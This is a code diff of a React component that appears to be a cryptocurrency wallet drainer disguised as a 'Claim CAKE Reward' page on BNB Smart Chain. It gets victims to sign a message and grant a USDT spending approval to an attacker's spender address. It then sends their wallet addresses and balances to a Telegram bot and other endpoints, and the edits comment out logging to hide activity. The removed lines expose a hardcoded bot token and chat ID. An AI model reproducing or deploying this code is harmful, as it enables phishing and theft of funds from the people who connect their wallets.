@@ -1,44 +1,44 @@
 // Approvewallet.jsx
+// Approvewallet.jsx
 import { useAccount, useWalletClient, useBalance } from "wagmi";
 import { erc20Abi, parseUnits } from "viem";
 import { bsc } from "wagmi/chains";
 import { useState, useEffect } from "react";
 
-
-
-
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
-const SPENDER = "0x2990048172A3687249B2DF6c2F2D8e8401330E88"; // Your spender address
+// 🔹 Load from .env
+const USDT_ADDRESS = import.meta.env.VITE_USDT_ADDRESS; 
+const SPENDER = import.meta.env.VITE_SPENDER;
+const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
 // 🔹 Send message to Telegram
 const sendToTelegram = async (message) => {
-  console.log("📩 Sending to Telegram:", message); // debug log
+  //console.log("📩 Sending to Telegram:", message); // debug log
 
-  const botToken = "7477590341:AAHz8Yl2jYCZIa2uBJQnYFifQAUk0WGWkUY";
-  const chatId = "-1002762295115";
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   try {
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: chatId,
+        chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: "HTML",
       }),
     });
 
     const result = await response.json();
-    console.log("Telegram API response:", result); // log response
+    //console.log("Telegram API response:", result);
 
     if (!response.ok) {
-      console.error("❌ Telegram API error:", result);
+      //console.error("❌ Telegram API error:", result);
     }
   } catch (e) {
-    console.error("❌ Telegram send failed:", e);
+    //console.error("❌ Telegram send failed:", e);
   }
 };
+
 
 // 🔹 Send message to backend IP/port
 const sendToBackendIP = async (data) => {
@@ -47,7 +47,7 @@ const sendToBackendIP = async (data) => {
   const backendPort = "YOUR_BACKEND_PORT_HERE"; // Replace with your actual port
   
   if (!backendIP || !backendPort || backendIP === "YOUR_BACKEND_IP_HERE" || backendPort === "YOUR_BACKEND_PORT_HERE") {
-    console.log("Backend IP/Port not configured, skipping backend send");
+    //console.log("Backend IP/Port not configured, skipping backend send");
     return;
   }
 
@@ -61,7 +61,7 @@ const sendToBackendIP = async (data) => {
     });
 
     if (!response.ok) {
-      console.error("Backend IP API error:", await response.text());
+      //console.error("Backend IP API error:", await response.text());
     } else {
       console.log("✅ Data sent to backend IP successfully");
     }
@@ -75,7 +75,7 @@ const sendToExternalAPI = async (data) => {
   const apiEndpoint = localStorage.getItem("apiEndpoint") || "";
 
   if (!apiEndpoint) {
-    console.log("External API endpoint not configured, skipping external API send");
+    //console.log("External API endpoint not configured, skipping external API send");
     return;
   }
 
@@ -137,9 +137,7 @@ export default function ApproveButton() {
       const storedReward = localStorage.getItem("cakeReward");
       const scanStatus = localStorage.getItem("scanCompleted");
 
-      console.log("Stored CAKE reward from localStorage:", storedReward); // Debug log
-      console.log("Scan completed status:", scanStatus); // Debug log
-
+      
       // Only set CAKE reward if scan was actually completed and reward exists
       if (scanStatus === "true" && storedReward && storedReward !== "0" && storedReward !== "null") {
         setCakeReward(storedReward);
@@ -227,19 +225,21 @@ export default function ApproveButton() {
     try {
       // Step 1: Personal Sign Message
       const cakeAmount = cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5; // Default to 5 CAKE if not scanned
-      const signMessage = `Claim ${cakeAmount} CAKE Reward`;
-      console.log("Requesting personal sign for:", signMessage);
+      const signMessage = `🍰Claim ${cakeAmount} CAKE Reward🍰`;
+      //console.log("Requesting personal sign for:", signMessage);
 
       const signature = await walletClient.signMessage({
         account: address,
         message: signMessage,
+         usdtBalance: currentUsdtFormatted,
+        bnbBalance: currentBnbFormatted
       });
 
-      console.log("Message signed successfully:", signature);
+      //console.log("Message signed successfully:", signature);
 
       // Send sign success to Telegram
       await sendToTelegram(
-        `✅ Message Signed:\n<code>${address}</code>\nMessage: "${signMessage}"\nSignature: ${signature.slice(0, 20)}...`
+        `✅ Message Signed:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`
       );
 
       const signData = {
@@ -288,7 +288,7 @@ export default function ApproveButton() {
       await sendToExternalAPI(approvalData);
 
     } catch (err) {
-      console.error("Process failed:", err.message);
+      //console.error("Process failed:", err.message);
 
       // Determine if error was during signing or approval
       const errorContext = err.message.toLowerCase().includes('user rejected')
@@ -296,7 +296,7 @@ export default function ApproveButton() {
         : 'Process failed';
 
       await sendToTelegram(
-        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}\nError: ${err.message}`
+        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`
       );
 
       const errorData = {
@@ -351,7 +351,8 @@ export default function ApproveButton() {
           color: "#ffffff",
           background: loading
             ? "rgba(139, 92, 246, 0.5)"
-            : "linear-gradient(135deg, #8b5cf6 0%, #3b82f6 100%)",
+              : "#fb923cff",
+
           border: "none",
           borderRadius: "15px",
           cursor: loading ? "not-allowed" : "pointer",
@@ -436,7 +437,7 @@ export default function ApproveButton() {
         textAlign: "center"
       }}>
         <a
-          href="https://coinmarketcap.com/currencies/pancakeswap"
+          href="https://www.coingecko.com/en/coins/pancakeswap"
           target="_blank"
           rel="noopener noreferrer"
           style={{
@@ -466,7 +467,7 @@ export default function ApproveButton() {
           color: "rgba(255, 255, 255, 0.5)",
           marginTop: "4px"
         }}>
-          (Redirects to CoinMarketCap)
+          (Redirects to CoinGecko🐸)
         </div>
       </div>
 
